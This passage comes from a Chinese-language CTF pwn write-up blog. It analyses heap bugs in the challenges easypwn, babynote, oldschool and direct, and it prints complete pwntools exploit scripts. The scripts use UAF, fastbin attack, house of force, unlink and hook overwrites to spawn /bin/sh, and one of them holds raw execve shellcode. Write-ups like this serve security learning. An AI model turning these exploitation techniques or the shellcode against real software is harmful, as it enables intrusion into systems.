class="hljs-number">0x40</span>))    delete(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0xe8</span> - <span class="hljs-number">0x30</span>)    add(<span class="hljs-number">0xe8</span>)    add(<span class="hljs-number">0x20</span>)    delete(<span class="hljs-number">2</span>)    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) +p64(<span class="hljs-number">0</span>)+ p16(<span class="hljs-number">0x57f8</span>- <span class="hljs-number">0x10</span>) + <span class="hljs-string">'\n'</span>    edit(<span class="hljs-number">1</span>,payload)    add(<span class="hljs-number">0xe8</span>)    delete(<span class="hljs-number">2</span>)    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p16(<span class="hljs-number">0x45cf</span>) + <span class="hljs-string">'\n'</span>    edit(<span class="hljs-number">1</span>,payload)    add(<span class="hljs-number">0xe8</span>)    add(<span class="hljs-number">0xe8</span>)    edit(<span class="hljs-number">6</span>, <span class="hljs-string">'b'</span> * <span class="hljs-number">0x41</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>) + <span class="hljs-string">'\n'</span>)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./easypwn'</span>)        <span class="hljs-comment"># io = remote('39.101.184.181',10000)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)delete(<span class="hljs-number">2</span>)edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_2_1_stdin_'</span>] + <span class="hljs-number">143</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0xe8</span>)add(<span class="hljs-number">0xe8</span>)edit(<span class="hljs-number">7</span>,<span class="hljs-string">'\0'</span> * <span class="hljs-number">0xe1</span> + p32(<span class="hljs-number">0xf1</span>) + <span class="hljs-string">'\n'</span>)delete(<span class="hljs-number">2</span>)edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_2_1_stdin_'</span>] + <span class="hljs-number">376</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0xe8</span>)add(<span class="hljs-number">0xe8</span>)rec = libc_addr + <span class="hljs-number">0xf0364</span><span class="hljs-comment"># realloc = libc_addr + libc.symbols['realloc'] + realloc[1]</span>payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0xa0</span> + p64(rec) + p64(rec) + <span class="hljs-string">'\n'</span>edit(<span class="hljs-number">8</span>, payload)info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)add(<span class="hljs-number">0xe8</span>)itr()<span class="hljs-comment"># 0x45226 execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   rax == NULL</span><span class="hljs-comment"># 0x4527a execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x30] == NULL</span><span class="hljs-comment"># 0xf0364 execve("/bin/sh", rsp+0x50, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x50] == NULL</span><span class="hljs-comment"># 0xf1207 execve("/bin/sh", rsp+0x70, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x70] == NULL</span></code></pre></div><h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h4 id="regist"><a href="#regist" class="headerlink" title="regist()"></a>regist()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">strcpy</span>(name, &amp;s);</code></pre></div><div class="hljs"><pre><code class="hljs c">__isoc99_scanf(<span class="hljs-string">"%lld"</span>, &amp;age1); <span class="hljs-comment">// 长整数</span></code></pre></div><p>可能造成溢出。在栈中，其下面紧挨着age。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/n2fCnS.png" srcset="/img/loading.gif" alt></p><p>在bss段，其下面紧挨着heap存放的地址。</p><h4 id="addnote"><a href="#addnote" class="headerlink" title="addnote()"></a>addnote()</h4><ul><li>只能申请6个堆。</li><li>申请了一个堆，其size放在距离其堆地址·<code>6 * 8</code>的位置。</li><li>可以根据堆序号申请堆，判断堆序号是否存在的依据：此堆对应的size位有没有数值（也适用于shownote，deletenote,editnote）<h4 id="deletenote"><a href="#deletenote" class="headerlink" title="deletenote()"></a>deletenote()</h4></li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">3</span> )                                <span class="hljs-comment">// 可以输入负数</span>  &#123;    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">0xA</span>LL)] )    &#123;      <span class="hljs-built_in">free</span>(*(<span class="hljs-keyword">void</span> **)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">4L</span>L)]);<span class="hljs-comment">// 反编译错了 是8 *（xx）</span>      *(_QWORD *)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">0xA</span>LL)] = <span class="hljs-number">0L</span>L;<span class="hljs-comment">//uaf heap没有清0,size 清0</span>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);    &#125;</code></pre></div><ul><li>存在uaf</li><li>只能删除<code>idx&lt;=3</code> 的堆</li><li>可以输入负堆号，可以根据其逻辑来删除一些特殊的堆</li></ul><h4 id="editnote"><a href="#editnote" class="headerlink" title="editnote()"></a>editnote()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">3</span> &amp;&amp; v1 &gt;= <span class="hljs-number">0</span> )</code></pre></div><ul><li>只能编辑前4个堆</li></ul><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>leak libc</li><li>free(-1) free(-2) 删除掉motto name的堆块</li><li>利用reset，调用regist，利用strcpy来溢出age的数值，控制第一个chunk的size，造成一个堆块重叠</li><li>删除0、1、2chunk，申请一个大的chunk，可以覆盖到chunk 1的fd从而修改，进行fastbin attack</li><li>打malloc hook 为 one gadget</li></ul><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babynotes'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reg</span><span class="hljs-params">(name,motto,age)</span>:</span>    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'motto'</span>,str(motto))    sla(<span class="hljs-string">'age'</span>,str(age))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    <span class="hljs-comment"># if int(idx) &lt;=3:</span>    sla(<span class="hljs-string">'dex'</span>,str(idx))    <span class="hljs-comment"># if int(idx) &gt;3:</span>        <span class="hljs-comment"># idx = </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reset</span><span class="hljs-params">(name,motto,age)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)    reg(name,motto,age)name = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x18</span>motto = <span class="hljs-string">'b'</span> * <span class="hljs-number">0x20</span>age = <span class="hljs-number">0x100</span>reg(name,motto,age)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>) add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>) add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x100</span>) add(<span class="hljs-number">4</span>,<span class="hljs-number">0x18</span>) free(<span class="hljs-number">3</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)show(<span class="hljs-number">5</span>)ru(<span class="hljs-string">'ote 5: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4c78</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)free(<span class="hljs-number">-1</span>)free(<span class="hljs-number">-2</span>)age = <span class="hljs-number">0x1111111100000141</span>reset(name,<span class="hljs-string">' '</span>,age)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_basepayload = <span class="hljs-number">11</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook)edit(<span class="hljs-number">0</span>,payload)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)one = <span class="hljs-number">0xf0364</span> + libc_basepayload = (<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>) * <span class="hljs-string">'1'</span> + p64(<span class="hljs-number">0</span>) + p64(one)edit(<span class="hljs-number">3</span>,payload)free(<span class="hljs-number">3</span>)itr()</code></pre></div><p>还有一种思路，就是因为bss段的age，free（-3）也可以进行free的，控制其为一个0x68堆块地址的话，就可以出现一个0x70的fastbin块，然后其size是不会北抹除的，所以利用uaf直接edit其fd为malloc hook，fastbin attack 攻击即可。</p><h3 id="另一种打法"><a href="#另一种打法" class="headerlink" title="另一种打法"></a>另一种打法</h3><h4 id="addnote-1"><a href="#addnote-1" class="headerlink" title="addnote()"></a>addnote()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input note size: "</span>);   __isoc99_scanf(<span class="hljs-string">"%lld"</span>, &amp;size);   <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> __int64)size &lt;= <span class="hljs-number">0x100</span> )   &#123;</code></pre></div><p>这里有个遗漏点，add的size是可以输入负的</p><h4 id="house-of-force使用条件"><a href="#house-of-force使用条件" class="headerlink" title="house of  force使用条件"></a>house of  force使用条件</h4><p>比赛时没有想到，因为house of  force相关的有点遗忘了。</p><ul><li>可以溢出到top chunk的 size，篡改 size 为一个很大值,就可以轻松的通过top chunk的相关验证，常见就是修改为 <code>-1</code> </li><li>可以申请任意size的堆块，正负都行，但是有不同的攻击限制</li></ul><p>这题是可以满足的:</p><ul><li>利用strcpy来溢出age的数值 ，很简单的控制top chunk的 size</li><li>可以申请负的堆块，负的堆块可以打heap 或者 got ，获取一个任意地址写,<strong>通常应该都是打heap</strong></li></ul><h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>修改top chunk的size</li><li>利用house of  force，将top chunk向前移动，使得其与现有的chunk重合</li><li>然后通过malloc一个小堆块，构造好 fake chunk，控制现有堆的size和prev_size后_</li><li>做unlink，实现任意地址读写。</li></ul><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">'./babynotes'</span>)<span class="hljs-comment"># sh = remote('123.56.170.202',43121)</span>elf = ELF(<span class="hljs-string">'./babynotes'</span>)libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)free_got = elf.got[<span class="hljs-string">'free'</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(sh)    pause()context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]sh.sendafter(<span class="hljs-string">'Input your name:'</span>,<span class="hljs-string">'haivk'</span>)sh.sendafter(<span class="hljs-string">'Input your motto:'</span>,<span class="hljs-string">'pwnit'</span>)sh.sendlineafter(<span class="hljs-string">'Input your age:'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(index,size)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))   sh.sendlineafter(<span class="hljs-string">'Input note size:'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(index)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,content)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))   sh.sendafter(<span class="hljs-string">'Input your note:'</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reset</span><span class="hljs-params">()</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)reset()sh.sendafter(<span class="hljs-string">'Input your name:'</span>,<span class="hljs-string">'haivk'</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">'a'</span>))sh.sendafter(<span class="hljs-string">'Input your motto:'</span>,<span class="hljs-string">'pwnit'</span>)sh.sendlineafter(<span class="hljs-string">'Input your age:'</span>,<span class="hljs-string">'-1'</span>)add(<span class="hljs-number">4</span>,<span class="hljs-number">-0x370</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>)<span class="hljs-comment">#top chunk上移</span>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0x110</span>))heap0_ptr_addr = <span class="hljs-number">0x6020E0</span>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(heap0_ptr_addr - <span class="hljs-number">0x18</span>) + p64(heap0_ptr_addr - <span class="hljs-number">0x10</span>))debug()<span class="hljs-comment">#unlink</span>delete(<span class="hljs-number">1</span>)debug()edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(free_got))show(<span class="hljs-number">0</span>)sh.recvuntil(<span class="hljs-string">'Note 0: '</span>)free_addr = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))libc_base = free_addr - libc.sym[<span class="hljs-string">'free'</span>]system_addr = libc_base + libc.sym[<span class="hljs-string">'system'</span>]edit(<span class="hljs-number">0</span>,p64(system_addr))edit(<span class="hljs-number">2</span>,<span class="hljs-string">'/bin/sh\x00'</span>)<span class="hljs-comment">#getshell</span>delete(<span class="hljs-number">2</span>)sh.interactive()</code></pre></div><p>exp 来自 haivk 大师傅。</p><h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>给了源码，分析程序带来了很大的便利。<br>会发现很多地方对size大小验证不是很多，是负数也行，但是对此题的攻击，用途并不大。</p><div class="hljs"><pre><code class="hljs c">g_ptr =  mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);</code></pre></div><p>这里可以看到申请的mmap区，是可以进行执行的，可以考虑一下shellcode。</p><h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mmap_edit</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">if</span>(g_ptr == <span class="hljs-literal">NULL</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Mmap first!"</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">unsigned</span> value;    <span class="hljs-keyword">unsigned</span> idx;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);    idx = get_int();         <span class="hljs-keyword">if</span>(g_ptr + idx &lt; g_ptr &amp;&amp; (<span class="hljs-keyword">unsigned</span>)(g_ptr + idx) &lt; ADDR_HIGH)&#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid idx"</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Value: "</span>);    value = get_int();     g_ptr[idx] = value;&#125;</code></pre></div><p>可以看到其对<code>g_ptr + idx</code>的验证是很简单的，给足大的偏移，可以改到libc的。是一个数组溢出。</p><h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1:"></a>思路1:</h4><ul><li>先正常分配，泄漏出libc地址</li><li>分配一下mmap，利用数组溢出，进行修改<code>malloc_hook</code>，为mmap的地址。</li><li>在mmap的内存上填上shellcode</li></ul><h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2:"></a>思路2:</h4><ul><li>先正常分配，泄漏出libc地址</li><li>分配一下mmap，利用数组溢出，进行修改<code>free_hook</code>，为system。</li><li>free 一个 带有<code>/bin/sh</code>的chunk即可</li></ul><p>这个更好点。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mmap_add</span><span class="hljs-params">(addr)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'6'</span>)    sla(<span class="hljs-string">'start'</span>,str(addr))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mmap_edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'7'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'lue'</span>,str(data))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i,<span class="hljs-number">0x90</span>)add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">7</span>)add(<span class="hljs-number">10</span>,<span class="hljs-number">0x10</span>)show(<span class="hljs-number">10</span>)ru(<span class="hljs-string">'ent: '</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d8828</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)system = <span class="hljs-number">0x3d200</span> + libc_basefree_hook = <span class="hljs-number">0x1d98d0</span> + libc_basemmap_add(<span class="hljs-number">0</span>)<span class="hljs-string">'''# one wayoffset = ((libc_base+0x1d8788 - 0xe0000000)) / 4mmap_edit(offset,'3758096384')shellcode = '\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'shellcode = [int(0xd231c931),int(0x2f2f6852),int(0x2f686873),int(0x896e6962),int(0xb0c031e3),int(0x80cd0b)]for i in range(len(shellcode)):    mmap_edit(i,shellcode[i])add(13,0x10)'''</span><span class="hljs-comment"># two way</span>offset = ((free_hook - <span class="hljs-number">0xe0000000</span>)) / <span class="hljs-number">4</span>mmap_edit(offset,int(system))edit(<span class="hljs-number">9</span>,<span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">9</span>)itr()</code></pre></div><h2 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><ul><li><p>申请的chunk最大值为0x100,max为16个</p></li><li><p>size可以为负值</p><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4></li><li><p>offset, size 都可以为负值</p></li><li><p><code>read(0, (void *)(heaplist[idx] + offset), nbytes);</code> 这里存在负溢出，可以修改上一个chunk里面的值</p></li></ul><h4 id="open-file函数"><a href="#open-file函数" class="headerlink" title="open file函数"></a>open file函数</h4><ul><li>只能调用一次，调用后可以进行edit chunk</li></ul><h4 id="close-函数"><a href="#close-函数" class="headerlink" title="close 函数"></a>close 函数</h4><div class="hljs"><pre><code class="hljs c">result = (<span class="hljs-keyword">ssize_t</span>)readdir(dirp);    v1 = result;    <span class="hljs-keyword">if</span> ( result )    &#123;      put(<span class="hljs-string">"Filename: "</span>);      result = put2(v1 + <span class="hljs-number">0x13</span>);</code></pre></div><p>进行打印文件名。</p><p>可以看到漏洞点就是在edit那里，且没有show函数。leak libc是此题的难点。因为是没有puts函数进行输出，所以攻击stdout也没有用。</p><p><strong>重点是了解opendir 和 readdir。</strong><br>参考链接：<br><a href="https://blog.csdn.net/cainiao000001/article/details/80988738" target="_blank" 